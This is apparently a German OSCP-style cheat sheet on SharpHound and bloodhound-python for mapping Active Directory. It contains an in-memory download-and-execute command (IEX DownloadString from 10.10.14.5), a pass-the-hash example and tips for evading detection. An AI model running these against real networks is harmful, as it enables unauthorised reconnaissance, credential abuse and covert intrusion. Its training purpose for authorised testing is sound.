# SharpHound - BloodHound Data Collector

## Was ist SharpHound?

SharpHound ist der offizielle Data Ingestor für BloodHound. Sammelt Active Directory-Informationen über Benutzer, Gruppen, Computer, Trusts, ACLs, Sessions etc.

**Zwei Varianten:**
- `SharpHound.exe` - Kompilierte C# Binary (für Windows)
- `SharpHound.ps1` - PowerShell-Script (für Windows)
- `bloodhound-python` - Python-Implementierung (für Linux/Kali)

---

## Installation & Download

### Windows (SharpHound.exe)
```powershell
# Download latest release
https://github.com/BloodHoundAD/SharpHound/releases

# Oder direkt kompilieren
git clone https://github.com/BloodHoundAD/SharpHound3
cd SharpHound3
dotnet build
```

### Linux (bloodhound-python)
```bash
# Via pip
pip3 install bloodhound

# Oder via apt
sudo apt install bloodhound.py
```

---

## SharpHound.exe - Windows Binary

### Basis-Syntax
```powershell
.\SharpHound.exe -c All
```

### Collection Methods

| Method | Beschreibung | Dauer | Lautstärke |
|--------|--------------|-------|------------|
| `Default` | Standard-Collection | Mittel | Mittel |
| `All` | Alles sammeln (empfohlen) | Lang | Hoch |
| `DCOnly` | Nur Domain Controller | Schnell | Niedrig |
| `Session` | Nur Sessions | Schnell | Mittel |
| `LocalAdmin` | Lokale Admins | Mittel | Mittel |
| `Group` | Gruppen-Membership | Schnell | Niedrig |
| `Trusts` | Domain Trusts | Schnell | Niedrig |
| `ACL` | ACLs/Permissions | Lang | Mittel |
| `Container` | OU/Container-Struktur | Schnell | Niedrig |
| `GPOLocalGroup` | GPO-basierte Local Groups | Mittel | Mittel |
| `LoggedOn` | Angemeldete User | Schnell | Hoch |
| `ObjectProps` | Objekt-Properties | Mittel | Niedrig |
| `RDP` | RDP-Rechte | Schnell | Niedrig |
| `DCOM` | DCOM-Rechte | Schnell | Niedrig |
| `PSRemote` | PowerShell Remoting Rechte | Schnell | Niedrig |

### Wichtige Kommandos

#### Standard Collection (empfohlen)
```powershell
.\SharpHound.exe -c All --zipfilename output.zip
```

#### Schnelle Collection (nur DC-Daten)
```powershell
.\SharpHound.exe -c DCOnly
```

#### Stealth Collection (weniger laut)
```powershell
.\SharpHound.exe -c DCOnly,Group,Trusts --stealth
```

#### Custom Collection
```powershell
.\SharpHound.exe -c Group,LocalAdmin,Session,Trusts
```

### Domain-Spezifikation

#### Domain Controller explizit angeben
```powershell
.\SharpHound.exe -c All -d corp.local --domaincontroller 10.10.10.100
```

#### Mehrere Domains
```powershell
.\SharpHound.exe -c All -d corp.local,dev.corp.local
```

#### Search Forest
```powershell
.\SharpHound.exe -c All --searchforest
```

### Credentials

#### Mit aktuellen Credentials (Standard)
```powershell
.\SharpHound.exe -c All
```

#### Mit expliziten Credentials
```powershell
.\SharpHound.exe -c All --ldapusername user@corp.local --ldappassword 'P@ssw0rd'
```

#### Ohne LDAP (nur lokale Daten)
```powershell
.\SharpHound.exe -c Session,LoggedOn --CollectionMethod Session
```

### Output-Optionen

#### Zip-Filename festlegen
```powershell
.\SharpHound.exe -c All --zipfilename bloodhound_corp.zip
```

#### Output-Directory
```powershell
.\SharpHound.exe -c All --outputdirectory C:\Temp
```

#### Kein Zip (nur JSON)
```powershell
.\SharpHound.exe -c All --nozip
```

#### Pretty-Print JSON
```powershell
.\SharpHound.exe -c All --prettyprint
```

### Performance & Throttling

#### Threads anpassen
```powershell
# Mehr Threads = schneller aber lauter (Default: 50)
.\SharpHound.exe -c All --threads 100

# Weniger Threads = langsamer aber leiser
.\SharpHound.exe -c All --threads 10
```

#### Timeout anpassen
```powershell
.\SharpHound.exe -c All --ldaptimeout 10
```

#### Loop Collection (wiederholtes Sammeln)
```powershell
# Alle 60 Minuten sammeln, 5x wiederholen
.\SharpHound.exe -c Session --loopduration 01:00:00 --loopcount 5
```

### Stealth & OPSEC

#### Stealth Mode
```powershell
# Weniger Queries, langsamer, unauffälliger
.\SharpHound.exe -c All --stealth
```

#### Exclude Domain Controllers
```powershell
.\SharpHound.exe -c All --excludedcs
```

#### Throttle (Verzögerung zwischen Queries)
```powershell
.\SharpHound.exe -c All --throttle 1000  # 1000ms Pause
```

#### Status/Progress-Messages deaktivieren
```powershell
.\SharpHound.exe -c All --nostatus
```

### Filtering & Scope

#### Computer-Filter
```powershell
# Nur bestimmte Computer
.\SharpHound.exe -c All --computerfile computers.txt
```

#### Distinguished Name
```powershell
# Nur bestimmte OU
.\SharpHound.exe -c All --distinguishedname "OU=Servers,DC=corp,DC=local"
```

#### Exclude DCs
```powershell
.\SharpHound.exe -c All --excludedcs
```

---

## SharpHound.ps1 - PowerShell Version

### Laden & Ausführen
```powershell
# Import
Import-Module .\SharpHound.ps1

# Oder via IEX (Speicherbasiert)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/SharpHound.ps1')
```

### Invoke-BloodHound
```powershell
# Standard
Invoke-BloodHound -CollectionMethod All

# Mit Zip-Output
Invoke-BloodHound -CollectionMethod All -ZipFileName output.zip

# Domain angeben
Invoke-BloodHound -CollectionMethod All -Domain corp.local

# Mit Credentials
$cred = Get-Credential
Invoke-BloodHound -CollectionMethod All -Credential $cred
```

---

## bloodhound-python (Linux/Kali)

### Installation
```bash
pip3 install bloodhound
# Oder
sudo apt install bloodhound.py
```

### Basis-Syntax
```bash
bloodhound-python -u username -p 'password' -d corp.local -ns 10.10.10.100 -c All
```

### Wichtige Parameter

#### Mit Passwort
```bash
bloodhound-python -u user -p 'pass' -d corp.local -dc dc01.corp.local -ns 10.10.10.100 -c All
```

#### Mit NTLM-Hash
```bash
bloodhound-python -u user --hashes :NTLM_HASH -d corp.local -dc dc01.corp.local -ns 10.10.10.100 -c All
```

#### Mit Kerberos
```bash
bloodhound-python -u user -p 'pass' -d corp.local -dc dc01.corp.local -ns 10.10.10.100 -c All -k
```

### Collection Methods
```bash
# Nur DC-Daten (schnell)
bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.100 -c DCOnly

# Alles (empfohlen)
bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.100 -c All

# Custom
bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.100 -c Group,LocalAdmin,Session
```

### DNS & Nameserver
```bash
# DNS-Server explizit angeben (wichtig!)
bloodhound-python -u user -p 'pass' -d corp.local -dc dc01.corp.local -ns 10.10.10.100 -c All

# /etc/hosts sollte gesetzt sein
echo "10.10.10.100  dc01 dc01.corp.local corp.local" | sudo tee -a /etc/hosts
```

### Über Proxychains
```bash
# Wichtig für Pivoting
proxychains bloodhound-python -u user -p 'pass' -d corp.local -dc dc01.corp.local -ns 10.10.10.100 -c All
```

### Output
```bash
# Zip-Dateiname
bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.100 -c All --zip

# Output-Directory
bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.100 -c All -o /tmp/bloodhound
```

---

## Praktische OSCP-Workflows

### Workflow 1: Von Windows aus (mit Shell)
```powershell
# 1. SharpHound hochladen (z.B. via evil-winrm, SMB, HTTP)
upload SharpHound.exe

# 2. Ausführen
.\SharpHound.exe -c All --zipfilename loot.zip

# 3. Runterladen
download loot.zip
```

### Workflow 2: Von Kali aus (über Credentials)
```bash
# 1. /etc/hosts setzen
echo "10.10.10.100  dc01 dc01.corp.local corp.local" | sudo tee -a /etc/hosts

# 2. Sammeln
bloodhound-python -u user -p 'password' -d corp.local -dc dc01.corp.local -ns 10.10.10.100 -c All

# 3. JSONs werden erstellt
ls *.json
```

### Workflow 3: Über Pivot/Proxychains
```bash
# 1. Proxychains konfiguriert? (/etc/proxychains4.conf)
# 2. /etc/hosts setzen
echo "10.10.10.100  dc01 dc01.corp.local corp.local" | sudo tee -a /etc/hosts

# 3. Über Proxy sammeln
proxychains bloodhound-python -u user -p 'pass' -d corp.local -dc dc01.corp.local -ns 10.10.10.100 -c All
```

### Workflow 4: Mit NTLM-Hash (Pass-the-Hash)
```bash
# Nach Hash-Dump (z.B. via secretsdump)
bloodhound-python -u administrator --hashes :8846f7eaee8fb117ad06bdd830b7586c -d corp.local -dc dc01.corp.local -ns 10.10.10.100 -c All
```

---

## Troubleshooting

### "Could not resolve DC"
```bash
# /etc/hosts setzen!
echo "10.10.10.100  dc01 dc01.corp.local corp.local" | sudo tee -a /etc/hosts

# Oder DC explizit angeben
bloodhound-python -u user -p 'pass' -d corp.local -dc dc01.corp.local -ns 10.10.10.100 -c All
```

### "Kerberos Clock Skew too great"
```bash
# Zeit synchronisieren
sudo ntpdate dc01.corp.local
# Oder
sudo rdate -n dc01.corp.local
```

### "LDAP Connection Failed"
```powershell
# Windows: DC explizit angeben
.\SharpHound.exe -c All --domaincontroller 10.10.10.100

# Credentials prüfen
.\SharpHound.exe -c All --ldapusername user@corp.local --ldappassword 'pass'
```

### "Authentication Failed"
```bash
# Domain korrekt?
bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.100 -c DCOnly

# Mit Debug
bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.100 -c DCOnly -v
```

### Firewall-Probleme
```bash
# Benötigte Ports:
# 389 - LDAP
# 636 - LDAPS
# 88 - Kerberos
# 445 - SMB

# Testen
nc -zv 10.10.10.100 389
nc -zv 10.10.10.100 636
```

---

## OPSEC-Considerations

### Was SharpHound hinterlässt:

1. **LDAP-Queries** - Viele LDAP-Anfragen (Event ID 4662 bei aktiviertem Audit)
2. **SMB-Verbindungen** - Zu vielen Hosts für Session-Collection
3. **DNS-Queries** - Viele Reverse-Lookups
4. **Netzwerk-Traffic** - Erhöhter Traffic zum DC

### Weniger auffällig:

```powershell
# Nur DC-Daten (keine SMB zu Workstations)
.\SharpHound.exe -c DCOnly

# Stealth Mode
.\SharpHound.exe -c All --stealth --throttle 2000

# Weniger Threads
.\SharpHound.exe -c All --threads 5

# Exclude DCs
.\SharpHound.exe -c All --excludedcs
```

---

## Quick Reference

| Kommando | Beschreibung |
|----------|--------------|
| `.\SharpHound.exe -c All` | Standard Collection (Windows) |
| `.\SharpHound.exe -c DCOnly` | Nur DC-Daten (schnell, leise) |
| `bloodhound-python -u user -p pass -d domain -ns IP -c All` | Linux Collection |
| `--domaincontroller IP` | DC explizit angeben |
| `--zipfilename out.zip` | Output-Dateiname |
| `--stealth` | Stealth-Modus |
| `--threads N` | Thread-Anzahl |
| `--ldapusername USER --ldappassword PASS` | Explizite Credentials |
| `-k` | Kerberos-Auth (bloodhound.py) |
| `--hashes :NTLM` | Pass-the-Hash (bloodhound.py) |

---

## OSCP-Tipps

1. **bloodhound-python bevorzugen** - Funktioniert besser über Proxychains/Pivoting
2. **DCOnly für schnelles Enum** - Wenn du nur Domänen-Struktur brauchst
3. **All für vollständige Analyse** - Wenn du Zeit hast
4. **/etc/hosts IMMER setzen** - Sonst DNS-Probleme
5. **Mit -c DCOnly starten** - Um Credentials/Connection zu testen
6. **Output-Dateien sichern** - `.zip` für BloodHound import
